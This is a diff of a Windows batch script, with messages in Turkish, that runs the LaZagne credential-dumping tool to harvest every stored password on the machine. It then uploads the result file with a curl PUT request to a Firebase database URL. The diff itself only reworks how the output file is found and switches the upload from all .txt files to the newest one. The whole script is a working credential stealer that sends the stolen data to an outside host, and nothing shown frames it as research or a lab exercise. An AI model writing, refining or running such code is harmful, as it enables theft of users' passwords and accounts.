@@ -64,53 +64,32 @@ echo Running: "%LAZ_EXE%" all -oN -output "%RESULT_DIR%"
 "%LAZ_EXE%" all -oN -output "%RESULT_DIR%" >nul 2>&1
 if errorlevel 1 (
     echo [ERROR] LaZagne calistirilirken hata olustu.
-    dir "%RESULT_DIR%\*.txt" /b > "%TEMP%\output_files.txt"
-    set "RESULT_FILE="
-    for /f "delims=" %%i in (%TEMP%\output_files.txt) do (
-        set "RESULT_FILE=%%i"
-    )
-    if defined RESULT_FILE (
-        echo [INFO] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE!
-    ) else (
-        echo [ERROR] Sonuc dosyasi olusturulamadi!
-        pause
-        exit /b 1
-    )
 ) else (
-    dir "%RESULT_DIR%\*.txt" /b > "%TEMP%\output_files.txt"
-    set "RESULT_FILE="
-    for /f "delims=" %%i in (%TEMP%\output_files.txt) do (
-        set "RESULT_FILE=%%i"
-    )
-    if defined RESULT_FILE (
-        echo [OK] LaZagne tamamlandi, cikti: %RESULT_DIR%\!RESULT_FILE!
-    ) else (
-        echo [ERROR] Sonuc dosyasi olusturulamadi!
-        pause
-        exit /b 1
-    )
+    echo [OK] LaZagne calistirildi.
 )
 
-:: Sonuc dosyasinin varligini kontrol et
+:: En son olusturulan .txt dosyasini bul
+set "RESULT_FILE="
+for /f "delims=" %%i in ('dir "%RESULT_DIR%\*.txt" /b /od 2^>nul') do (
+    set "RESULT_FILE=%%i"
+)
 if not defined RESULT_FILE (
     echo [ERROR] Sonuc dosyasi bulunamadi!
     pause
     exit /b 1
 )
-echo [OK] Sonuc dosyasi mevcut: %RESULT_DIR%\!RESULT_FILE!
+echo [OK] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE!
 
 :: Sonuclarin Firebase'e yuklenmesi (curl ile)
 echo [INFO] Sonuclar Firebase'e yukleniyor...
-for %%F in ("%RESULT_DIR%\*.txt") do (
-    echo   -> Yukleniyor: %%~nxF
-    curl.exe -X PUT -d @%%F "%FIREBASE_URL%/%%~nxF.json" --silent --show-error
-    if errorlevel 1 (
-        echo [ERROR] %%~nxF yuklenemedi!
-        pause
-        exit /b 1
-    ) else (
-        echo [OK] %%~nxF yuklendi.
-    )
+set "FULL_PATH=%RESULT_DIR%\!RESULT_FILE!"
+curl.exe -X PUT -d @"%FULL_PATH%" "%FIREBASE_URL%/!RESULT_FILE!.json" --silent --show-error
+if errorlevel 1 (
+    echo [ERROR] !RESULT_FILE! yuklenemedi!
+    pause
+    exit /b 1
+) else (
+    echo [OK] !RESULT_FILE! yuklendi.
 )
 
 echo ------------------------------------------------------------
